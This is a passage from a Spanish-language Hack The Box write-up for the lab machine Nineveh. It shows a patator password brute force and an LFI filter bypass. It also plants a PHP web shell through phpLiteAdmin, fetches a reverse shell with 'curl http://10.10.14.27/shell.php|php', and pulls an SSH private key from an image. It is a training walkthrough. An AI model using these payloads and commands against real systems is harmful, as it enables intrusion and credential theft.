+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ./patator.py http_fuzz &lt;span class=&quot;nv&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://nineveh.htb/department/login.php&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;POST &lt;span class=&quot;nv&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username=admin&amp;amp;password=FILE0'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; ignore:fgrep&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Invalid Password&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\!&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+21:52:36 patator    INFO - Starting Patator 0.9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/lanjelot/patator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with python-3.9.2 at 2021-11-27 21:52 CST
+21:52:36 patator    INFO -                                                                              
+21:52:36 patator    INFO - code size:clen       &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; | candidate                          |   num | mesg
+21:52:36 patator    INFO - &lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------&lt;/span&gt;
+21:53:40 patator    INFO - 302  2049:1706      0.137 | 1q2w3e4r5t                         |  4553 | HTTP/1.1 302 Found
+^C21:53:45 patator    INFO - Hits/Done/Skip/Fail/Size: 1/4910/0/0/14344392, Avg: 71 r/s, Time: 0h 1m 8s
+21:53:45 patator    INFO - To resume execution, pass &lt;span class=&quot;nt&quot;&gt;--resume&lt;/span&gt; 491,491,491,491,491,491,491,491,491,491
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos las credenciales del segundo panel del login &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin : 1q2w3e4r5t&lt;/code&gt;; asi que vamos a guardarlas y luego utilizarlas para ver el contenido web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si seleccionamos el apartado de &lt;strong&gt;Notes&lt;/strong&gt;, vemos que se nos muestra un mensaje y la dirección URL parece algo curiosa, al parecer está apuntando a un archivo dentro del sistema llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ninevehNotes.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- Have you fixed the login page yet! hardcoded username and password is really bad idea!
+- check your serect folder to get in! figure it out! this is your challenge
+- Improve the db interface.
+    ~amrois
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El mensaje nos da algunas pistas y confirma la parte de que se está leyendo un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ninevehNotes.txt&lt;/code&gt;; asi que vamos a quitarle la extensión a ver que pasa.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos un mensaje de alertas indicando que el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ninevehNotes&lt;/code&gt; no existe bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/department/&lt;/code&gt;. A este punto podríamos pensar que el sitio podría ser vulnerable a &lt;strong&gt;LFI (Local File Inclusion)&lt;/strong&gt;; así que vamos a tratar de ver el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://nineveh.htb/department/manage.php?notes=/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El sitio nos arroja &lt;strong&gt;&lt;em&gt;No note is selected&lt;/em&gt;&lt;/strong&gt;. Podríamos probar un &lt;strong&gt;Directory Traversal&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://nineveh.htb/department/manage.php?notes=/../../../../etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Sin embargo, tampoco vemos nada. Si hacemos varias pruebas, el mensaje de alerta solo nos aparece cuando está la palabra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ninevehNotes&lt;/code&gt;, por lo que podríamos pensar que se está aplicando algún filtro para evitar que podamos acceder a otro archivo. A este punto podríamos probar el ejemplo anterior pero agregando la palabra clave:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos capacidad de visualizar archivos internos de la máquina. Con esto ya tenemos la posibilidad de ingresar a la máquina, por lo que primero vamos a crearnos una base de datos en la plataforma de &lt;strong&gt;&lt;em&gt;phpLiteAdmin&lt;/em&gt;&lt;/strong&gt; con extensión php y agregarle contenido malicioso para posteriormente desde el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/department&lt;/code&gt; apuntar a nuestro archivo y ganar acceso a la máquina.&lt;/p&gt;
+
+&lt;p&gt;Primero vamos a crear nuestra base de datos en la parte donde indica &lt;strong&gt;Create New Database&lt;/strong&gt; que llamaremos &lt;strong&gt;k4miyo.php&lt;/strong&gt;. Una vez creada la seleccionamos en al parte donde indica &lt;strong&gt;Change Database&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora en la parte donde nos dice &lt;strong&gt;Create new table on database ‘k4miyo.php’&lt;/strong&gt;, en la sección de &lt;strong&gt;Name&lt;/strong&gt; colocamos lo que queramos, en este caso &lt;em&gt;shell&lt;/em&gt; y en &lt;strong&gt;Number of Fields&lt;/strong&gt; podemos 1 y el damos click en &lt;strong&gt;Go&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Posteriormente, en &lt;strong&gt;Type&lt;/strong&gt; seleccionamos &lt;strong&gt;TEXT&lt;/strong&gt;, en &lt;strong&gt;Field&lt;/strong&gt; insertamos nuestro código php &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;?php system($_REQUEST[&quot;cmd&quot;]) ?&amp;gt;&lt;/code&gt; y le damos en &lt;strong&gt;Create&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya tenemos nuestro archivo php que si le damos en &lt;strong&gt;Return&lt;/strong&gt; nos mostrará información sobre nuestro archivo y lo que nos interesa es la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/tmp/k4miyo.php&lt;/code&gt; para que podamos apuntar desde el otro sitio web, que es lo que haremos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/k4miyo.php&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora para poder ejecutar comandos, haremos uso de la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt; y hay que tener en cuentra que para agregarla a la dirección URL lo haremos con el símbolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt; debido a el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; ya está siendo usado:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/k4miyo.php&amp;amp;cmd=whoami&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya tenemos ejecución de comando a nivel de sistema, ahora nos queda ingresar a la máquina; para este caso haremos uso de la herramienta &lt;a href=&quot;https://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;php-reverse-shell&lt;/a&gt;, así que la descargamos en nuestro directorio de trabajo, los descomprimimos y modificamos los parámetros que nos indica dentro del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt;. Una vez hecho esto, nos compartimos un servidor HTTP con python, nos podemos en escucha y procedemos a entablarnos una reverse shell.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/k4miyo.php&amp;amp;cmd=curl http://10.10.14.27/shell.php|php&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.43 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;28/Nov/2021 20:43:22] &lt;span class=&quot;s2&quot;&gt;&quot;GET /shell.php HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.43] 56104
+Linux nineveh 4.4.0-62-generic &lt;span class=&quot;c&quot;&gt;#83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
+ 20:48:20 up 57 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.01, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
+$ whoami
+www-data
+$ 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina y como siempre, para trabajar más cómodos, vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Nos encontramos como el usuario &lt;strong&gt;www-data&lt;/strong&gt; y no podemos visualizar la flag ya que no tenemos los permisos necesarios. Vamos a enumerar un poco el sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/home/amrois&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id 
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+www-data@nineveh:/home/amrois&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: 
+www-data@nineveh:/home/amrois&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No vemos nada interesante, así que podriamos probar buscar recursos interesantes dentro de los servidores bajo las rutas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/hmlt&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/ssl&lt;/code&gt; y bajo la última, nos encontramos un directorio llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secure_notes&lt;/code&gt; el cual presenta dos archivos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/var/www/ssl&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 560
+drwxr-xr-x 2 root root   4096 Jul  2  2017 db
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root     49 Jul  2  2017 index.html
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 560852 Jul  2  2017 ninevehForAll.png
+drwxr-xr-x 2 root root   4096 Jul  2  2017 secure_notes
+www-data@nineveh:/var/www/ssl&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;secure_notes/
+www-data@nineveh:/var/www/ssl/secure_notes&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 2832
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root      71 Jul  2  2017 index.html
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 2891984 Jul  2  2017 nineveh.png
+www-data@nineveh:/var/www/ssl/secure_notes&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a observar las cadenas imprimibles de la imagen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nineveh.png&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/var/www/ssl/secure_notes&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings nineveh.png
+...
+www-data
+&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
+H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
+PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
+FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
+3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
+X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
+KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
+FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
+GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
+JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
+9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
+Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
+ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
+1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
+vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
+DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
+P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
+fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
+tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
+iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
+MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
+PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
+i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
+il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
+fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
+secret/nineveh.pub
+0000644
+0000041
+0000041
+00000000620
+13126060277
+014541
+ustar  
+www-data
+www-data
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
+www-data@nineveh:/var/www/ssl/secure_notes&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos una clave id_rsa, la cual de acuerdo con lo observado, podría ser del usuario &lt;strong&gt;amrois&lt;/strong&gt;; sin embargo, no se observa el puerto 22 abierto externamente, así que vamos a validarlo de manera interna.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/var/www/ssl/secure_notes&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-nat&lt;/span&gt;
+Active Internet connections &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;servers and established&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:80              0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
+tcp        0      0 0.0.0.0:443             0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN     
+tcp        0      0 10.10.10.43:80          10.10.14.27:34440       ESTABLISHED
+tcp        0    138 10.10.10.43:56104       10.10.14.27:443         ESTABLISHED
+tcp6       0      0 :::22                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN     
+www-data@nineveh:/var/www/ssl/secure_notes&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo que podríamos hacer es un &lt;strong&gt;&lt;em&gt;Remote Port Forwarding&lt;/em&gt;&lt;/strong&gt; para alcanzar el puerto desde nuestra máquina de manera local y aprovechar la id_rsa; por lo que primero creamos un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; y le asignamos el privilegio 600.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora procedemos crear un tunel para alcanzar el puerto 22 de la máquina víctima a través del puerto 4646 de nuestro equipo de atacante (&lt;strong&gt;Nota&lt;/strong&gt;: En el comando se observa el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p 2222&lt;/code&gt; ya que es el puerto que tengo configurado y además es importante iniciar el servicio ssh &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service ssh start&lt;/code&gt;).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/var/www/ssl/secure_notes&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 4646:127.0.0.1:22 k4miyo@10.10.14.27 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2222
+Could not create directory &lt;span class=&quot;s1&quot;&gt;'/var/www/.ssh'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;'[10.10.14.27]:2222 ([10.10.14.27]:2222)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
+ECDSA key fingerprint is SHA256:X+58wT4JhCZo1JHA1IfaUg4HqR7NmOzkqFouwQwkYu0.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+k4miyo@10.10.14.27'&lt;/span&gt;s password: 
+Linux k4mipc 5.14.0-2parrot1-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 5.14.6-2parrot1 (2021-09-25) x86_64&lt;/span&gt;
+ ____                      _     ____            
+|  _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;__ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
+| |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; / _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; | &lt;span class=&quot;s1&quot;&gt;'__| '&lt;/span&gt;__/ _ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; __| &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; __|
+|  __/ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | |  | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |_   ___&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |  __/ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__ 
+|_|   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_|_|  |_|  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_| |____/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|
+                                                 
+
+
+
+The programs included with the Parrot GNU/Linux are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
+individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.
+
+Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+░▒▓    ~  ✔  with k4miyo@k4mipc ▓▒░ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
